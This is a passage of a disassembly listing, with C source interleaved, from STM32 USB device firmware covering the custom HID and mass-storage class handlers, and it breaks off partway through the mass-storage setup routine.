 8008bc2:	685b      	ldr	r3, [r3, #4]
 8008bc4:	68db      	ldr	r3, [r3, #12]
 8008bc6:	68fa      	ldr	r2, [r7, #12]
 8008bc8:	7810      	ldrb	r0, [r2, #0]
 8008bca:	68fa      	ldr	r2, [r7, #12]
 8008bcc:	7852      	ldrb	r2, [r2, #1]
 8008bce:	4611      	mov	r1, r2
 8008bd0:	4798      	blx	r3
                                                                           hhid->Report_buf[1]);

  return (uint8_t)USBD_OK;
 8008bd2:	2300      	movs	r3, #0
}
 8008bd4:	4618      	mov	r0, r3
 8008bd6:	3710      	adds	r7, #16
 8008bd8:	46bd      	mov	sp, r7
 8008bda:	bd80      	pop	{r7, pc}

08008bdc <USBD_CUSTOM_HID_ReceivePacket>:
  *         prepare OUT Endpoint for reception
  * @param  pdev: device instance
  * @retval status
  */
uint8_t USBD_CUSTOM_HID_ReceivePacket(USBD_HandleTypeDef *pdev)
{
 8008bdc:	b580      	push	{r7, lr}
 8008bde:	b084      	sub	sp, #16
 8008be0:	af00      	add	r7, sp, #0
 8008be2:	6078      	str	r0, [r7, #4]
  USBD_CUSTOM_HID_HandleTypeDef *hhid;

  if (pdev->pClassDataCmsit[pdev->classId] == NULL)
 8008be4:	687b      	ldr	r3, [r7, #4]
 8008be6:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008bea:	687b      	ldr	r3, [r7, #4]
 8008bec:	32b0      	adds	r2, #176	; 0xb0
 8008bee:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008bf2:	2b00      	cmp	r3, #0
 8008bf4:	d101      	bne.n	8008bfa <USBD_CUSTOM_HID_ReceivePacket+0x1e>
  {
    return (uint8_t)USBD_FAIL;
 8008bf6:	2303      	movs	r3, #3
 8008bf8:	e01c      	b.n	8008c34 <USBD_CUSTOM_HID_ReceivePacket+0x58>
#ifdef USE_USBD_COMPOSITE
  /* Get OUT Endpoint address allocated for this class instance */
  CUSTOMHIDOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_INTR, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008bfa:	687b      	ldr	r3, [r7, #4]
 8008bfc:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008c00:	687b      	ldr	r3, [r7, #4]
 8008c02:	32b0      	adds	r2, #176	; 0xb0
 8008c04:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008c08:	60fb      	str	r3, [r7, #12]

  /* Resume USB Out process */
  (void)USBD_LL_PrepareReceive(pdev, CUSTOMHIDOutEpAdd, hhid->Report_buf,
 8008c0a:	4b0c      	ldr	r3, [pc, #48]	; (8008c3c <USBD_CUSTOM_HID_ReceivePacket+0x60>)
 8008c0c:	7819      	ldrb	r1, [r3, #0]
 8008c0e:	68fa      	ldr	r2, [r7, #12]
 8008c10:	230f      	movs	r3, #15
 8008c12:	6878      	ldr	r0, [r7, #4]
 8008c14:	f004 f920 	bl	800ce58 <USBD_LL_PrepareReceive>
                               USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);

  if(((recv_buffer[0]=(hhid->Report_buf[0]))&0x02) != 0x02){
 8008c18:	68fb      	ldr	r3, [r7, #12]
 8008c1a:	781a      	ldrb	r2, [r3, #0]
 8008c1c:	4b08      	ldr	r3, [pc, #32]	; (8008c40 <USBD_CUSTOM_HID_ReceivePacket+0x64>)
 8008c1e:	701a      	strb	r2, [r3, #0]
 8008c20:	4b07      	ldr	r3, [pc, #28]	; (8008c40 <USBD_CUSTOM_HID_ReceivePacket+0x64>)
 8008c22:	781b      	ldrb	r3, [r3, #0]
 8008c24:	f003 0302 	and.w	r3, r3, #2
 8008c28:	2b02      	cmp	r3, #2
 8008c2a:	d002      	beq.n	8008c32 <USBD_CUSTOM_HID_ReceivePacket+0x56>
	  InterruptFlag = 1;
 8008c2c:	4b05      	ldr	r3, [pc, #20]	; (8008c44 <USBD_CUSTOM_HID_ReceivePacket+0x68>)
 8008c2e:	2201      	movs	r2, #1
 8008c30:	601a      	str	r2, [r3, #0]
  }
  return (uint8_t)USBD_OK;
 8008c32:	2300      	movs	r3, #0
}
 8008c34:	4618      	mov	r0, r3
 8008c36:	3710      	adds	r7, #16
 8008c38:	46bd      	mov	sp, r7
 8008c3a:	bd80      	pop	{r7, pc}
 8008c3c:	200000a7 	.word	0x200000a7
 8008c40:	2000026c 	.word	0x2000026c
 8008c44:	20000270 	.word	0x20000270

08008c48 <USBD_CUSTOM_HID_EP0_RxReady>:
  *         Handles control request data.
  * @param  pdev: device instance
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_EP0_RxReady(USBD_HandleTypeDef *pdev)
{
 8008c48:	b580      	push	{r7, lr}
 8008c4a:	b084      	sub	sp, #16
 8008c4c:	af00      	add	r7, sp, #0
 8008c4e:	6078      	str	r0, [r7, #4]
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008c50:	687b      	ldr	r3, [r7, #4]
 8008c52:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008c56:	687b      	ldr	r3, [r7, #4]
 8008c58:	32b0      	adds	r2, #176	; 0xb0
 8008c5a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008c5e:	60fb      	str	r3, [r7, #12]

  if (hhid == NULL)
 8008c60:	68fb      	ldr	r3, [r7, #12]
 8008c62:	2b00      	cmp	r3, #0
 8008c64:	d101      	bne.n	8008c6a <USBD_CUSTOM_HID_EP0_RxReady+0x22>
  {
    return (uint8_t)USBD_FAIL;
 8008c66:	2303      	movs	r3, #3
 8008c68:	e016      	b.n	8008c98 <USBD_CUSTOM_HID_EP0_RxReady+0x50>
  }

  if (hhid->IsReportAvailable == 1U)
 8008c6a:	68fb      	ldr	r3, [r7, #12]
 8008c6c:	69db      	ldr	r3, [r3, #28]
 8008c6e:	2b01      	cmp	r3, #1
 8008c70:	d111      	bne.n	8008c96 <USBD_CUSTOM_HID_EP0_RxReady+0x4e>
  {
    ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->OutEvent(hhid->Report_buf[0],
 8008c72:	687b      	ldr	r3, [r7, #4]
 8008c74:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008c78:	687a      	ldr	r2, [r7, #4]
 8008c7a:	33b0      	adds	r3, #176	; 0xb0
 8008c7c:	009b      	lsls	r3, r3, #2
 8008c7e:	4413      	add	r3, r2
 8008c80:	685b      	ldr	r3, [r3, #4]
 8008c82:	68db      	ldr	r3, [r3, #12]
 8008c84:	68fa      	ldr	r2, [r7, #12]
 8008c86:	7810      	ldrb	r0, [r2, #0]
 8008c88:	68fa      	ldr	r2, [r7, #12]
 8008c8a:	7852      	ldrb	r2, [r2, #1]
 8008c8c:	4611      	mov	r1, r2
 8008c8e:	4798      	blx	r3
                                                                             hhid->Report_buf[1]);
    hhid->IsReportAvailable = 0U;
 8008c90:	68fb      	ldr	r3, [r7, #12]
 8008c92:	2200      	movs	r2, #0
 8008c94:	61da      	str	r2, [r3, #28]
  }

  return (uint8_t)USBD_OK;
 8008c96:	2300      	movs	r3, #0
}
 8008c98:	4618      	mov	r0, r3
 8008c9a:	3710      	adds	r7, #16
 8008c9c:	46bd      	mov	sp, r7
 8008c9e:	bd80      	pop	{r7, pc}

08008ca0 <USBD_CUSTOM_HID_GetDeviceQualifierDesc>:
  *         return Device Qualifier descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetDeviceQualifierDesc(uint16_t *length)
{
 8008ca0:	b480      	push	{r7}
 8008ca2:	b083      	sub	sp, #12
 8008ca4:	af00      	add	r7, sp, #0
 8008ca6:	6078      	str	r0, [r7, #4]
  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_DeviceQualifierDesc);
 8008ca8:	687b      	ldr	r3, [r7, #4]
 8008caa:	220a      	movs	r2, #10
 8008cac:	801a      	strh	r2, [r3, #0]

  return USBD_CUSTOM_HID_DeviceQualifierDesc;
 8008cae:	4b03      	ldr	r3, [pc, #12]	; (8008cbc <USBD_CUSTOM_HID_GetDeviceQualifierDesc+0x1c>)
}
 8008cb0:	4618      	mov	r0, r3
 8008cb2:	370c      	adds	r7, #12
 8008cb4:	46bd      	mov	sp, r7
 8008cb6:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008cba:	4770      	bx	lr
 8008cbc:	2000009c 	.word	0x2000009c

08008cc0 <USBD_CUSTOM_HID_RegisterInterface>:
  * @param  fops: CUSTOMHID Interface callback
  * @retval status
  */
uint8_t USBD_CUSTOM_HID_RegisterInterface(USBD_HandleTypeDef *pdev,
                                          USBD_CUSTOM_HID_ItfTypeDef *fops)
{
 8008cc0:	b480      	push	{r7}
 8008cc2:	b083      	sub	sp, #12
 8008cc4:	af00      	add	r7, sp, #0
 8008cc6:	6078      	str	r0, [r7, #4]
 8008cc8:	6039      	str	r1, [r7, #0]
  if (fops == NULL)
 8008cca:	683b      	ldr	r3, [r7, #0]
 8008ccc:	2b00      	cmp	r3, #0
 8008cce:	d101      	bne.n	8008cd4 <USBD_CUSTOM_HID_RegisterInterface+0x14>
  {
    return (uint8_t)USBD_FAIL;
 8008cd0:	2303      	movs	r3, #3
 8008cd2:	e009      	b.n	8008ce8 <USBD_CUSTOM_HID_RegisterInterface+0x28>
  }

  pdev->pUserData[pdev->classId] = fops;
 8008cd4:	687b      	ldr	r3, [r7, #4]
 8008cd6:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008cda:	687a      	ldr	r2, [r7, #4]
 8008cdc:	33b0      	adds	r3, #176	; 0xb0
 8008cde:	009b      	lsls	r3, r3, #2
 8008ce0:	4413      	add	r3, r2
 8008ce2:	683a      	ldr	r2, [r7, #0]
 8008ce4:	605a      	str	r2, [r3, #4]

  return (uint8_t)USBD_OK;
 8008ce6:	2300      	movs	r3, #0
}
 8008ce8:	4618      	mov	r0, r3
 8008cea:	370c      	adds	r7, #12
 8008cec:	46bd      	mov	sp, r7
 8008cee:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008cf2:	4770      	bx	lr

08008cf4 <USBD_MSC_Init>:
  * @param  pdev: device instance
  * @param  cfgidx: configuration index
  * @retval status
  */
uint8_t USBD_MSC_Init(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 8008cf4:	b580      	push	{r7, lr}
 8008cf6:	b084      	sub	sp, #16
 8008cf8:	af00      	add	r7, sp, #0
 8008cfa:	6078      	str	r0, [r7, #4]
 8008cfc:	460b      	mov	r3, r1
 8008cfe:	70fb      	strb	r3, [r7, #3]
  UNUSED(cfgidx);
  USBD_MSC_BOT_HandleTypeDef *hmsc;

  hmsc = (USBD_MSC_BOT_HandleTypeDef *)USBD_malloc_MSC(sizeof(USBD_MSC_BOT_HandleTypeDef));
 8008d00:	f241 0074 	movw	r0, #4212	; 0x1074
 8008d04:	f004 f938 	bl	800cf78 <USBD_static_malloc_MSC>
 8008d08:	60f8      	str	r0, [r7, #12]

  if (hmsc == NULL)
 8008d0a:	68fb      	ldr	r3, [r7, #12]
 8008d0c:	2b00      	cmp	r3, #0
 8008d0e:	d109      	bne.n	8008d24 <USBD_MSC_Init+0x30>
  {
    pdev->pClassDataCmsit[pdev->classId] = NULL;
 8008d10:	687b      	ldr	r3, [r7, #4]
 8008d12:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008d16:	687b      	ldr	r3, [r7, #4]
 8008d18:	32b0      	adds	r2, #176	; 0xb0
 8008d1a:	2100      	movs	r1, #0
 8008d1c:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    return (uint8_t)USBD_EMEM;
 8008d20:	2302      	movs	r3, #2
 8008d22:	e06e      	b.n	8008e02 <USBD_MSC_Init+0x10e>
  }

  pdev->pClassDataCmsit[pdev->classId] = (void *)hmsc;
 8008d24:	687b      	ldr	r3, [r7, #4]
 8008d26:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008d2a:	687b      	ldr	r3, [r7, #4]
 8008d2c:	32b0      	adds	r2, #176	; 0xb0
 8008d2e:	68f9      	ldr	r1, [r7, #12]
 8008d30:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
  pdev->pClassData = pdev->pClassDataCmsit[pdev->classId];
 8008d34:	687b      	ldr	r3, [r7, #4]
 8008d36:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008d3a:	687b      	ldr	r3, [r7, #4]
 8008d3c:	32b0      	adds	r2, #176	; 0xb0
 8008d3e:	f853 2022 	ldr.w	r2, [r3, r2, lsl #2]
 8008d42:	687b      	ldr	r3, [r7, #4]
 8008d44:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (pdev->dev_speed == USBD_SPEED_HIGH)
 8008d48:	687b      	ldr	r3, [r7, #4]
 8008d4a:	7c1b      	ldrb	r3, [r3, #16]
 8008d4c:	2b00      	cmp	r3, #0
 8008d4e:	d12b      	bne.n	8008da8 <USBD_MSC_Init+0xb4>
  {
    /* Open EP OUT */
    (void)USBD_LL_OpenEP(pdev, MSCOutEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_HS_PACKET);
 8008d50:	4b2e      	ldr	r3, [pc, #184]	; (8008e0c <USBD_MSC_Init+0x118>)
 8008d52:	7819      	ldrb	r1, [r3, #0]
 8008d54:	f44f 7300 	mov.w	r3, #512	; 0x200
 8008d58:	2202      	movs	r2, #2
 8008d5a:	6878      	ldr	r0, [r7, #4]
 8008d5c:	f003 feca 	bl	800caf4 <USBD_LL_OpenEP>
    pdev->ep_out[MSCOutEpAdd & 0xFU].is_used = 1U;
 8008d60:	4b2a      	ldr	r3, [pc, #168]	; (8008e0c <USBD_MSC_Init+0x118>)
 8008d62:	781b      	ldrb	r3, [r3, #0]
 8008d64:	f003 020f 	and.w	r2, r3, #15
 8008d68:	6879      	ldr	r1, [r7, #4]
 8008d6a:	4613      	mov	r3, r2
 8008d6c:	009b      	lsls	r3, r3, #2
 8008d6e:	4413      	add	r3, r2
 8008d70:	009b      	lsls	r3, r3, #2
 8008d72:	440b      	add	r3, r1
 8008d74:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008d78:	2201      	movs	r2, #1
 8008d7a:	801a      	strh	r2, [r3, #0]

    /* Open EP IN */
    (void)USBD_LL_OpenEP(pdev, MSCInEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_HS_PACKET);
 8008d7c:	4b24      	ldr	r3, [pc, #144]	; (8008e10 <USBD_MSC_Init+0x11c>)
 8008d7e:	7819      	ldrb	r1, [r3, #0]
 8008d80:	f44f 7300 	mov.w	r3, #512	; 0x200
 8008d84:	2202      	movs	r2, #2
 8008d86:	6878      	ldr	r0, [r7, #4]
 8008d88:	f003 feb4 	bl	800caf4 <USBD_LL_OpenEP>
    pdev->ep_in[MSCInEpAdd & 0xFU].is_used = 1U;
 8008d8c:	4b20      	ldr	r3, [pc, #128]	; (8008e10 <USBD_MSC_Init+0x11c>)
 8008d8e:	781b      	ldrb	r3, [r3, #0]
 8008d90:	f003 020f 	and.w	r2, r3, #15
 8008d94:	6879      	ldr	r1, [r7, #4]
 8008d96:	4613      	mov	r3, r2
 8008d98:	009b      	lsls	r3, r3, #2
 8008d9a:	4413      	add	r3, r2
 8008d9c:	009b      	lsls	r3, r3, #2
 8008d9e:	440b      	add	r3, r1
 8008da0:	3324      	adds	r3, #36	; 0x24
 8008da2:	2201      	movs	r2, #1
 8008da4:	801a      	strh	r2, [r3, #0]
 8008da6:	e028      	b.n	8008dfa <USBD_MSC_Init+0x106>
  }
  else
  {
    /* Open EP OUT */
    (void)USBD_LL_OpenEP(pdev, MSCOutEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_FS_PACKET);
 8008da8:	4b18      	ldr	r3, [pc, #96]	; (8008e0c <USBD_MSC_Init+0x118>)
 8008daa:	7819      	ldrb	r1, [r3, #0]
 8008dac:	2340      	movs	r3, #64	; 0x40
 8008dae:	2202      	movs	r2, #2
 8008db0:	6878      	ldr	r0, [r7, #4]
 8008db2:	f003 fe9f 	bl	800caf4 <USBD_LL_OpenEP>
    pdev->ep_out[MSCOutEpAdd & 0xFU].is_used = 1U;
 8008db6:	4b15      	ldr	r3, [pc, #84]	; (8008e0c <USBD_MSC_Init+0x118>)
 8008db8:	781b      	ldrb	r3, [r3, #0]
 8008dba:	f003 020f 	and.w	r2, r3, #15
 8008dbe:	6879      	ldr	r1, [r7, #4]
 8008dc0:	4613      	mov	r3, r2
 8008dc2:	009b      	lsls	r3, r3, #2
 8008dc4:	4413      	add	r3, r2
 8008dc6:	009b      	lsls	r3, r3, #2
 8008dc8:	440b      	add	r3, r1
 8008dca:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008dce:	2201      	movs	r2, #1
 8008dd0:	801a      	strh	r2, [r3, #0]

    /* Open EP IN */
    (void)USBD_LL_OpenEP(pdev, MSCInEpAdd, USBD_EP_TYPE_BULK, MSC_MAX_FS_PACKET);
 8008dd2:	4b0f      	ldr	r3, [pc, #60]	; (8008e10 <USBD_MSC_Init+0x11c>)
 8008dd4:	7819      	ldrb	r1, [r3, #0]
 8008dd6:	2340      	movs	r3, #64	; 0x40
 8008dd8:	2202      	movs	r2, #2
 8008dda:	6878      	ldr	r0, [r7, #4]
 8008ddc:	f003 fe8a 	bl	800caf4 <USBD_LL_OpenEP>
    pdev->ep_in[MSCInEpAdd & 0xFU].is_used = 1U;
 8008de0:	4b0b      	ldr	r3, [pc, #44]	; (8008e10 <USBD_MSC_Init+0x11c>)
 8008de2:	781b      	ldrb	r3, [r3, #0]
 8008de4:	f003 020f 	and.w	r2, r3, #15
 8008de8:	6879      	ldr	r1, [r7, #4]
 8008dea:	4613      	mov	r3, r2
 8008dec:	009b      	lsls	r3, r3, #2
 8008dee:	4413      	add	r3, r2
 8008df0:	009b      	lsls	r3, r3, #2
 8008df2:	440b      	add	r3, r1
 8008df4:	3324      	adds	r3, #36	; 0x24
 8008df6:	2201      	movs	r2, #1
 8008df8:	801a      	strh	r2, [r3, #0]
  }

  /* Init the BOT  layer */
  MSC_BOT_Init(pdev);
 8008dfa:	6878      	ldr	r0, [r7, #4]
 8008dfc:	f000 fa2c 	bl	8009258 <MSC_BOT_Init>

  return (uint8_t)USBD_OK;
 8008e00:	2300      	movs	r3, #0
}
 8008e02:	4618      	mov	r0, r3
 8008e04:	3710      	adds	r7, #16
 8008e06:	46bd      	mov	sp, r7
 8008e08:	bd80      	pop	{r7, pc}
 8008e0a:	bf00      	nop
 8008e0c:	2000010b 	.word	0x2000010b
 8008e10:	2000010a 	.word	0x2000010a

08008e14 <USBD_MSC_DeInit>:
  * @param  pdev: device instance
  * @param  cfgidx: configuration index
  * @retval status
  */
uint8_t USBD_MSC_DeInit(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 8008e14:	b580      	push	{r7, lr}
 8008e16:	b082      	sub	sp, #8
 8008e18:	af00      	add	r7, sp, #0
 8008e1a:	6078      	str	r0, [r7, #4]
 8008e1c:	460b      	mov	r3, r1
 8008e1e:	70fb      	strb	r3, [r7, #3]
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  /* Close MSC EPs */
  (void)USBD_LL_CloseEP(pdev, MSCOutEpAdd);
 8008e20:	4b26      	ldr	r3, [pc, #152]	; (8008ebc <USBD_MSC_DeInit+0xa8>)
 8008e22:	781b      	ldrb	r3, [r3, #0]
 8008e24:	4619      	mov	r1, r3
 8008e26:	6878      	ldr	r0, [r7, #4]
 8008e28:	f003 fea2 	bl	800cb70 <USBD_LL_CloseEP>
  pdev->ep_out[MSCOutEpAdd & 0xFU].is_used = 0U;
 8008e2c:	4b23      	ldr	r3, [pc, #140]	; (8008ebc <USBD_MSC_DeInit+0xa8>)
 8008e2e:	781b      	ldrb	r3, [r3, #0]
 8008e30:	f003 020f 	and.w	r2, r3, #15
 8008e34:	6879      	ldr	r1, [r7, #4]
 8008e36:	4613      	mov	r3, r2
 8008e38:	009b      	lsls	r3, r3, #2
 8008e3a:	4413      	add	r3, r2
 8008e3c:	009b      	lsls	r3, r3, #2
 8008e3e:	440b      	add	r3, r1
 8008e40:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 8008e44:	2200      	movs	r2, #0
 8008e46:	801a      	strh	r2, [r3, #0]

  /* Close EP IN */
  (void)USBD_LL_CloseEP(pdev, MSCInEpAdd);
 8008e48:	4b1d      	ldr	r3, [pc, #116]	; (8008ec0 <USBD_MSC_DeInit+0xac>)
 8008e4a:	781b      	ldrb	r3, [r3, #0]
 8008e4c:	4619      	mov	r1, r3
 8008e4e:	6878      	ldr	r0, [r7, #4]
 8008e50:	f003 fe8e 	bl	800cb70 <USBD_LL_CloseEP>
  pdev->ep_in[MSCInEpAdd & 0xFU].is_used = 0U;
 8008e54:	4b1a      	ldr	r3, [pc, #104]	; (8008ec0 <USBD_MSC_DeInit+0xac>)
 8008e56:	781b      	ldrb	r3, [r3, #0]
 8008e58:	f003 020f 	and.w	r2, r3, #15
 8008e5c:	6879      	ldr	r1, [r7, #4]
 8008e5e:	4613      	mov	r3, r2
 8008e60:	009b      	lsls	r3, r3, #2
 8008e62:	4413      	add	r3, r2
 8008e64:	009b      	lsls	r3, r3, #2
 8008e66:	440b      	add	r3, r1
 8008e68:	3324      	adds	r3, #36	; 0x24
 8008e6a:	2200      	movs	r2, #0
 8008e6c:	801a      	strh	r2, [r3, #0]

  /* Free MSC Class Resources */
  if (pdev->pClassDataCmsit[pdev->classId] != NULL)
 8008e6e:	687b      	ldr	r3, [r7, #4]
 8008e70:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008e74:	687b      	ldr	r3, [r7, #4]
 8008e76:	32b0      	adds	r2, #176	; 0xb0
 8008e78:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008e7c:	2b00      	cmp	r3, #0
 8008e7e:	d018      	beq.n	8008eb2 <USBD_MSC_DeInit+0x9e>
  {
    /* De-Init the BOT layer */
    MSC_BOT_DeInit(pdev);
 8008e80:	6878      	ldr	r0, [r7, #4]
 8008e82:	f000 fa6f 	bl	8009364 <MSC_BOT_DeInit>

    (void)USBD_free(pdev->pClassDataCmsit[pdev->classId]);
 8008e86:	687b      	ldr	r3, [r7, #4]
 8008e88:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008e8c:	687b      	ldr	r3, [r7, #4]
 8008e8e:	32b0      	adds	r2, #176	; 0xb0
 8008e90:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008e94:	4618      	mov	r0, r3
 8008e96:	f004 f87d 	bl	800cf94 <USBD_static_free>
    pdev->pClassDataCmsit[pdev->classId]  = NULL;
 8008e9a:	687b      	ldr	r3, [r7, #4]
 8008e9c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008ea0:	687b      	ldr	r3, [r7, #4]
 8008ea2:	32b0      	adds	r2, #176	; 0xb0
 8008ea4:	2100      	movs	r1, #0
 8008ea6:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
    pdev->pClassData = NULL;
 8008eaa:	687b      	ldr	r3, [r7, #4]
 8008eac:	2200      	movs	r2, #0
 8008eae:	f8c3 22bc 	str.w	r2, [r3, #700]	; 0x2bc
  }

  return (uint8_t)USBD_OK;
 8008eb2:	2300      	movs	r3, #0
}
 8008eb4:	4618      	mov	r0, r3
 8008eb6:	3708      	adds	r7, #8
 8008eb8:	46bd      	mov	sp, r7
 8008eba:	bd80      	pop	{r7, pc}
 8008ebc:	2000010b 	.word	0x2000010b
 8008ec0:	2000010a 	.word	0x2000010a

08008ec4 <USBD_MSC_Setup>:
  * @param  pdev: device instance
  * @param  req: USB request
  * @retval status
  */
uint8_t USBD_MSC_Setup(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 8008ec4:	b580      	push	{r7, lr}
 8008ec6:	b086      	sub	sp, #24
 8008ec8:	af00      	add	r7, sp, #0
 8008eca:	6078      	str	r0, [r7, #4]
 8008ecc:	6039      	str	r1, [r7, #0]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008ece:	687b      	ldr	r3, [r7, #4]
 8008ed0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008ed4:	687b      	ldr	r3, [r7, #4]
 8008ed6:	32b0      	adds	r2, #176	; 0xb0
 8008ed8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008edc:	613b      	str	r3, [r7, #16]
  USBD_StatusTypeDef ret = USBD_OK;
 8008ede:	2300      	movs	r3, #0
 8008ee0:	75fb      	strb	r3, [r7, #23]
  uint16_t status_info = 0U;
 8008ee2:	2300      	movs	r3, #0
 8008ee4:	81fb      	strh	r3, [r7, #14]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8008ee6:	693b      	ldr	r3, [r7, #16]
 8008ee8:	2b00      	cmp	r3, #0
 8008eea:	d101      	bne.n	8008ef0 <USBD_MSC_Setup+0x2c>
  {
    return (uint8_t)USBD_FAIL;
 8008eec:	2303      	movs	r3, #3
 8008eee:	e0e1      	b.n	80090b4 <USBD_MSC_Setup+0x1f0>
  }

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 8008ef0:	683b      	ldr	r3, [r7, #0]
 8008ef2:	781b      	ldrb	r3, [r3, #0]
 8008ef4:	f003 0360 	and.w	r3, r3, #96	; 0x60
 8008ef8:	2b00      	cmp	r3, #0
 8008efa:	d053      	beq.n	8008fa4 <USBD_MSC_Setup+0xe0>
 8008efc:	2b20      	cmp	r3, #32
 8008efe:	f040 80d1 	bne.w	80090a4 <USBD_MSC_Setup+0x1e0>
  {
    /* Class request */
    case USB_REQ_TYPE_CLASS:
      switch (req->bRequest)
 8008f02:	683b      	ldr	r3, [r7, #0]
 8008f04:	785b      	ldrb	r3, [r3, #1]
 8008f06:	2bfe      	cmp	r3, #254	; 0xfe
 8008f08:	d002      	beq.n	8008f10 <USBD_MSC_Setup+0x4c>
 8008f0a:	2bff      	cmp	r3, #255	; 0xff
 8008f0c:	d02a      	beq.n	8008f64 <USBD_MSC_Setup+0xa0>
 8008f0e:	e041      	b.n	8008f94 <USBD_MSC_Setup+0xd0>
      {
        case BOT_GET_MAX_LUN:
          if ((req->wValue  == 0U) && (req->wLength == 1U) &&
 8008f10:	683b      	ldr	r3, [r7, #0]
 8008f12:	885b      	ldrh	r3, [r3, #2]
 8008f14:	2b00      	cmp	r3, #0
 8008f16:	d11e      	bne.n	8008f56 <USBD_MSC_Setup+0x92>
 8008f18:	683b      	ldr	r3, [r7, #0]
 8008f1a:	88db      	ldrh	r3, [r3, #6]
 8008f1c:	2b01      	cmp	r3, #1
 8008f1e:	d11a      	bne.n	8008f56 <USBD_MSC_Setup+0x92>
              ((req->bmRequest & 0x80U) == 0x80U))
 8008f20:	683b      	ldr	r3, [r7, #0]
 8008f22:	781b      	ldrb	r3, [r3, #0]
 8008f24:	b25b      	sxtb	r3, r3
          if ((req->wValue  == 0U) && (req->wLength == 1U) &&
 8008f26:	2b00      	cmp	r3, #0
 8008f28:	da15      	bge.n	8008f56 <USBD_MSC_Setup+0x92>
          {
            hmsc->max_lun = (uint32_t)((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetMaxLun();
 8008f2a:	687b      	ldr	r3, [r7, #4]
 8008f2c:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008f30:	687a      	ldr	r2, [r7, #4]
 8008f32:	33b0      	adds	r3, #176	; 0xb0
 8008f34:	009b      	lsls	r3, r3, #2
 8008f36:	4413      	add	r3, r2
 8008f38:	685b      	ldr	r3, [r3, #4]
 8008f3a:	699b      	ldr	r3, [r3, #24]
 8008f3c:	4798      	blx	r3
 8008f3e:	4603      	mov	r3, r0
 8008f40:	461a      	mov	r2, r3
 8008f42:	693b      	ldr	r3, [r7, #16]
 8008f44:	601a      	str	r2, [r3, #0]
            (void)USBD_CtlSendData(pdev, (uint8_t *)&hmsc->max_lun, 1U);
 8008f46:	693b      	ldr	r3, [r7, #16]
 8008f48:	2201      	movs	r2, #1
 8008f4a:	4619      	mov	r1, r3
 8008f4c:	6878      	ldr	r0, [r7, #4]
 8008f4e:	f003 f979 	bl	800c244 <USBD_CtlSendData>
 8008f52:	bf00      	nop
          else
          {
            USBD_CtlError(pdev, req);
